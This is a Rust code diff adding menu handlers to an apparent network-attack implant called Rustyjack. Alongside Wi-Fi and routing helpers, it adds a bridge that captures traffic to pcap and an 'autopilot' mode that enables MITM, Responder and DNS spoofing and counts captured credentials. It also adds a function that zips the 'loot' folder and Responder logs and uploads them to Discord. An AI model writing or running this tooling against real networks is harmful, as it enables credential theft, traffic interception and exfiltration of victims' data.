+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
+        let resp: WifiScanResponse = serde_json::from_value(data)?;
+        Ok(resp)
+    }
+
+    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
+        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+            WifiProfileCommand::List,
+        )))?;
+        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
+        Ok(resp.profiles)
+    }
+
+    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
+        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
+        let resp: WifiListResponse = serde_json::from_value(data)?;
+        Ok(resp.interfaces)
+    }
+
+    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
+        let resp: RouteSnapshot = serde_json::from_value(data)?;
+        Ok(resp)
+    }
+
+    fn fetch_wifi_status(&mut self) -> Result<WifiStatusOverview> {
+        let args = WifiStatusArgs { interface: None };
+        let (_, data) = self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
+        let status: WifiStatusOverview = serde_json::from_value(data)?;
+        Ok(status)
+    }
+
+    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
+        let profiles = self.fetch_wifi_profiles()?;
+        if !profiles.iter().any(|profile| profile.ssid == ssid) {
+            return Ok(false);
+        }
+        self.connect_named_profile(ssid)?;
+        Ok(true)
+    }
+
+    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
+        let args = WifiProfileConnectArgs {
+            profile: Some(ssid.to_string()),
+            ssid: None,
+            password: None,
+            interface: None,
+            remember: false,
+        };
+        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+            WifiProfileCommand::Connect(args),
+        ))) {
+            Ok(_) => {
+                let msg = vec![format!("Connecting to {ssid}")];
+                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{err}")];
+                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
+        let args = WifiProfileDeleteArgs {
+            ssid: ssid.to_string(),
+        };
+        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+            WifiProfileCommand::Delete(args),
+        ))) {
+            Ok(_) => {
+                let msg = vec![format!("Deleted {ssid}")];
+                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{err}")];
+                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn show_route_snapshot(&mut self) -> Result<()> {
+        let snapshot = self.fetch_route_snapshot()?;
+        let mut lines = Vec::new();
+        if let Some(route) = snapshot.default_route.clone() {
+            if let Some(iface) = route.interface {
+                lines.push(format!("Default: {iface}"));
+            }
+            if let Some(gateway) = route.gateway {
+                lines.push(format!("Gateway: {gateway}"));
+            }
+        }
+        for iface in snapshot.interfaces.iter().take(4) {
+            let ip = iface.ip.as_deref().unwrap_or("no ip");
+            lines.push(format!("{} ({}) {ip}", iface.name, iface.oper_state));
+        }
+        if !snapshot.dns_servers.is_empty() {
+            lines.push("DNS:".to_string());
+            for dns in snapshot.dns_servers.iter().take(3) {
+                lines.push(format!("  {dns}"));
+            }
+        }
+        if lines.is_empty() {
+            lines.push("No routing data".to_string());
+        }
+        self.show_message("Routing", lines.iter().map(|s| s.as_str()))
+    }
+
+    fn backup_routes(&mut self) -> Result<()> {
+        match self
+            .core
+            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Backup)))
+        {
+            Ok((_, data)) => {
+                let path = data.get("path").and_then(Value::as_str).unwrap_or("saved");
+                let msg = vec![format!("Backup at {path}")];
+                self.show_message("Routing", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{err}")];
+                self.show_message("Route error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn restore_routes(&mut self) -> Result<()> {
+        match self.core.dispatch(Commands::Wifi(WifiCommand::Route(
+            WifiRouteCommand::Restore,
+        ))) {
+            Ok(_) => {
+                self.show_message("Routing", ["Restored last backup"])?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{err}")];
+                self.show_message("Route error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn start_bridge(&mut self) -> Result<()> {
+        let interfaces = self.fetch_wifi_interfaces()?;
+        if interfaces.len() < 2 {
+            self.show_message("Bridge", ["Need two interfaces"])?;
+            return Ok(());
+        }
+        let names: Vec<String> = interfaces.iter().map(|iface| iface.name.clone()).collect();
+        let Some(a) = self.choose_interface_name("Select bridge interface A", &names)? else {
+            return Ok(());
+        };
+        let Some(b) = self.choose_interface_name("Select bridge interface B", &names)? else {
+            return Ok(());
+        };
+        if a == b {
+            self.show_message("Bridge", ["Interfaces must differ"])?;
+            return Ok(());
+        }
+        let args = BridgeStartArgs {
+            interface_a: a.clone(),
+            interface_b: b.clone(),
+        };
+        match self
+            .core
+            .dispatch(Commands::Bridge(BridgeCommand::Start(args)))
+        {
+            Ok((_, data)) => {
+                self.bridge_pair = Some((a.clone(), b.clone()));
+                let capture = data
+                    .get("capture_path")
+                    .and_then(Value::as_str)
+                    .unwrap_or("");
+                let mut lines = vec![format!("Bridge {a}↔{b} active")];
+                if !capture.is_empty() {
+                    lines.push(format!(
+                        "pcap: {}",
+                        Path::new(capture)
+                            .file_name()
+                            .and_then(|n| n.to_str())
+                            .unwrap_or(capture)
+                    ));
+                }
+                self.show_message("Bridge", lines.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = err.to_string();
+                self.show_message("Bridge error", [msg.as_str()])?;
+            }
+        }
+        Ok(())
+    }
+
+    fn stop_bridge(&mut self) -> Result<()> {
+        let (a, b) = self
+            .bridge_pair
+            .clone()
+            .unwrap_or_else(|| ("eth0".to_string(), "eth1".to_string()));
+        let args = BridgeStopArgs {
+            interface_a: a.clone(),
+            interface_b: b.clone(),
+        };
+        match self
+            .core
+            .dispatch(Commands::Bridge(BridgeCommand::Stop(args)))
+        {
+            Ok(_) => {
+                self.show_message("Bridge", ["Bridge stopped"])?;
+                self.bridge_pair = None;
+            }
+            Err(err) => {
+                let msg = err.to_string();
+                self.show_message("Bridge error", [msg.as_str()])?;
+            }
+        }
+        Ok(())
+    }
+
+    fn discord_upload(&mut self) -> Result<()> {
+        let (temp_path, archive_path) = self.build_loot_archive()?;
+        let args = DiscordSendArgs {
+            title: "Rustyjack Loot".to_string(),
+            message: Some("Complete loot archive".to_string()),
+            file: Some(archive_path.clone()),
+            target: None,
+            interface: None,
+        };
+        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
+            DiscordCommand::Send(args),
+        )));
+        drop(temp_path);
+        match result {
+            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
+            Err(err) => {
+                let msg = err.to_string();
+                self.show_message("Discord", [msg.as_str()])?;
+            }
+        }
+        Ok(())
+    }
+
+    fn run_system_update(&mut self) -> Result<()> {
+        let args = SystemUpdateArgs {
+            service: "raspyjack".to_string(),
+            remote: "origin".to_string(),
+            branch: "main".to_string(),
+            backup_dir: None,
+        };
+        match self
+            .core
+            .dispatch(Commands::System(SystemCommand::Update(args)))
+        {
+            Ok((_, data)) => {
+                let backup = data
+                    .get("backup_path")
+                    .and_then(Value::as_str)
+                    .unwrap_or("archive");
+                let msg = vec!["Updated from git".to_string(), format!("Backup: {backup}")];
+                self.show_message("Update", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = err.to_string();
+                self.show_message("Update", [msg.as_str()])?;
+            }
+        }
+        Ok(())
+    }
+
+    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
+        let mut temp = NamedTempFile::new()?;
+        {
+            let mut zip = ZipWriter::new(&mut temp);
+            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
+            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
+            self.add_directory_to_zip(
+                &mut zip,
+                &self.root.join("Responder").join("logs"),
+                "ResponderLogs/",
+                options,
+            )?;
+            zip.finish()?;
+        }
+        let temp_path = temp.into_temp_path();
+        let path = temp_path.to_path_buf();
+        Ok((temp_path, path))
+    }
+
+    fn add_directory_to_zip(
+        &self,
+        zip: &mut ZipWriter<&mut NamedTempFile>,
+        dir: &Path,
+        prefix: &str,
+        options: FileOptions,
+    ) -> Result<()> {
+        if !dir.exists() {
+            return Ok(());
+        }
+        for entry in WalkDir::new(dir) {
+            let entry = entry?;
+            if entry.file_type().is_file() {
+                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
+                let mut name = PathBuf::from(prefix);
+                name.push(rel);
+                let name = name.to_string_lossy().replace('\\', "/");
+                zip.start_file(name, options)?;
+                let data = fs::read(entry.path())?;
+                zip.write_all(&data)?;
+            }
+        }
+        Ok(())
+    }
+
+    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
+        if names.is_empty() {
+            self.show_message("Interfaces", ["No interfaces detected"])?;
+            return Ok(None);
+        }
+        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
+        Ok(self
+            .choose_from_list(title, &labels)?
+            .map(|idx| names[idx].clone()))
+    }
+
+    fn autopilot_start(&mut self, mode: AutopilotMode) -> Result<()> {
+        let core_mode = match mode {
+            AutopilotMode::Standard => CoreAutopilotMode::Standard,
+            AutopilotMode::Aggressive => CoreAutopilotMode::Aggressive,
+            AutopilotMode::Stealth => CoreAutopilotMode::Stealth,
+            AutopilotMode::Harvest => CoreAutopilotMode::Harvest,
+        };
+
+        let args = AutopilotStartArgs {
+            mode: core_mode,
+            interface: None,
+            scan: true,
+            mitm: true,
+            responder: true,
+            dns_spoof: Some(self.spoof_site.clone()),
+            duration: 0,
+            check_interval: 30,
+        };
+
+        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Start(args))) {
+            Ok((_, data)) => {
+                let mode_str = data.get("mode").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let msg = vec![
+                    "Autopilot started".to_string(),
+                    format!("Mode: {}", mode_str),
+                    "Running...".to_string(),
+                ];
+                self.show_message("Autopilot", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{}", err)];
+                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn autopilot_stop(&mut self) -> Result<()> {
+        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Stop)) {
+            Ok(_) => {
+                self.show_message("Autopilot", ["Stopped"])?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{}", err)];
+                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+
+    fn autopilot_status(&mut self) -> Result<()> {
+        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Status)) {
+            Ok((_, data)) => {
+                let running = data.get("running").and_then(|v| v.as_bool()).unwrap_or(false);
+                let phase = data.get("phase").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let elapsed = data.get("elapsed_secs").and_then(|v| v.as_u64()).unwrap_or(0);
+                let creds = data.get("credentials_captured").and_then(|v| v.as_u64()).unwrap_or(0);
+                let packets = data.get("packets_captured").and_then(|v| v.as_u64()).unwrap_or(0);
+
+                let status_text = if running { "RUNNING" } else { "STOPPED" };
+                let elapsed_mins = elapsed / 60;
+                let elapsed_secs = elapsed % 60;
+
+                let msg = vec![
+                    format!("Status: {}", status_text),
+                    format!("Phase: {}", phase),
+                    format!("Time: {}m{}s", elapsed_mins, elapsed_secs),
+                    format!("Creds: {}", creds),
+                    format!("Pkts: {}", packets),
+                ];
+                self.show_message("Autopilot Status", msg.iter().map(|s| s.as_str()))?;
+            }
+            Err(err) => {
+                let msg = vec![format!("{}", err)];
+                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
+            }
+        }
+        Ok(())
+    }
+}
+
